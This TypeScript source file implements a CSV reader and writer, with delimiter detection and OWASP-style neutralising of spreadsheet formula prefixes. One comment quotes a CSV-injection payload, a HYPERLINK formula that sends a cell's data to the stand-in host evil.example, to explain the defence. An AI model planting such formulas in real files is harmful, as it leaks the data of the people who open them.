/**
 * A small RFC 4180 reader and writer.
 *
 * Written rather than depended on, per CLAUDE.md §16 ("Do not add a
 * dependency without documenting why it is needed"): the whole of what
 * this app needs from CSV is quoted fields, embedded separators and
 * newlines, and a delimiter guess. That is about sixty lines and is fully
 * tested here, against a library that would also bring streaming, type
 * coercion and a transform pipeline this app has no use for — and whose
 * own escaping would still have to be checked for the formula-injection
 * problem below, because most CSV writers do not address it.
 */

/** Rows of raw string cells, exactly as they appeared. */
export function parseCsv(text: string, delimiter?: string): string[][] {
  // A BOM is what Excel writes and what every naive parser turns into an
  // invisible prefix on the first header name.
  const input = text.replace(/^﻿/, "");
  const sep = delimiter ?? detectDelimiter(input);
  return parseWith(input, sep).rows;
}

interface ParseResult {
  rows: string[][];
  /**
   * How many fields had characters after their closing quote, e.g.
   * `"Müller, Zahnarzt";89` read with `,` as the delimiter. Well-formed
   * CSV never does this, so it is strong evidence the delimiter is wrong.
   */
  malformed: number;
}

function parseWith(input: string, sep: string): ParseResult {
  const rows: string[][] = [];
  let malformed = 0;
  let row: string[] = [];
  let field = "";
  let inQuotes = false;
  let i = 0;

  const endField = () => {
    row.push(field);
    field = "";
  };
  const endRow = () => {
    endField();
    rows.push(row);
    row = [];
  };

  while (i < input.length) {
    const char = input[i];

    if (inQuotes) {
      if (char === '"') {
        if (input[i + 1] === '"') {
          field += '"';
          i += 2;
          continue;
        }
        inQuotes = false;
        i += 1;
        const next = input[i];
        if (next !== undefined && next !== sep && next !== "\r" && next !== "\n") malformed += 1;
        continue;
      }
      field += char;
      i += 1;
      continue;
    }

    if (char === '"' && field === "") {
      inQuotes = true;
      i += 1;
      continue;
    }
    if (char === sep) {
      endField();
      i += 1;
      continue;
    }
    if (char === "\r") {
      // CRLF and a lone CR both end a row.
      endRow();
      i += input[i + 1] === "\n" ? 2 : 1;
      continue;
    }
    if (char === "\n") {
      endRow();
      i += 1;
      continue;
    }

    field += char;
    i += 1;
  }

  // A trailing newline should not produce a phantom empty row, but a file
  // with no trailing newline must not lose its last row either.
  if (field !== "" || row.length > 0) endRow();

  return { rows: rows.filter((cells) => cells.some((cell) => cell.trim() !== "")), malformed };
}

const CANDIDATE_DELIMITERS = [",", ";", "\t"] as const;

/**
 * Picks the delimiter by parsing with each candidate and judging the
 * result, rather than by counting characters.
 *
 * Counting looks simpler and is wrong on realistic data: in
 * `"Müller, Zahnarzt";89,90` there is exactly one comma and one semicolon
 * outside the quotes, so a count ties and has to guess — and guessing
 * comma splits the amount in half. Parsing with each candidate instead
 * shows that comma leaves a quoted field with text stuck to its closing
 * quote, which well-formed CSV never has.
 *
 * Ordered by: fewest malformed fields, then a consistent column count
 * across rows, then the most columns. German exports use `;` because `,`
 * is already the decimal separator there, which is exactly the data this
 * app expects to be handed.
 */
function detectDelimiter(input: string): string {
  let best: { sep: string; malformed: number; consistent: boolean; columns: number } | null = null;

  for (const sep of CANDIDATE_DELIMITERS) {
    const { rows, malformed } = parseWith(input, sep);
    if (rows.length === 0) continue;

    const columns = rows[0].length;
    const consistent = rows.every((row) => row.length === columns);
    const candidate = { sep, malformed, consistent, columns };

    if (
      best === null ||
      candidate.malformed < best.malformed ||
      (candidate.malformed === best.malformed &&
        ((candidate.consistent && !best.consistent) ||
          (candidate.consistent === best.consistent && candidate.columns > best.columns)))
    ) {
      best = candidate;
    }
  }

  return best?.sep ?? ",";
}

/**
 * Characters that make a spreadsheet treat a cell as a formula.
 *
 * This is CSV injection, and it is a real attack, not a theoretical one:
 * a description of `=HYPERLINK("https://evil.example/?d="&A1,"Click")`
 * executes when the exported file is opened in Excel or LibreOffice, with
 * the household's own data in the request. The export is the dangerous
 * direction precisely because the file leaves the app's control — the
 * browser's protections are irrelevant once a spreadsheet opens it.
 *
 * The mitigation is OWASP's: prefix the cell with a single quote, which
 * spreadsheets treat as "this is text". It is visible in the cell, which
 * is the honest trade — a slightly odd-looking export beats a file that
 * runs code.
 */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

export function escapeCsvField(value: string): string {
  const neutralised = FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix)) ? `'${value}` : value;

  if (/[",;\t\r\n]/.test(neutralised)) {
    return `"${neutralised.replace(/"/g, '""')}"`;
  }
  return neutralised;
}

export function toCsv(rows: readonly (readonly string[])[], delimiter = ","): string {
  // CRLF, because RFC 4180 says so and because Excel on Windows is the
  // overwhelmingly likely reader.
  return rows.map((row) => row.map(escapeCsvField).join(delimiter)).join("\r\n");
}
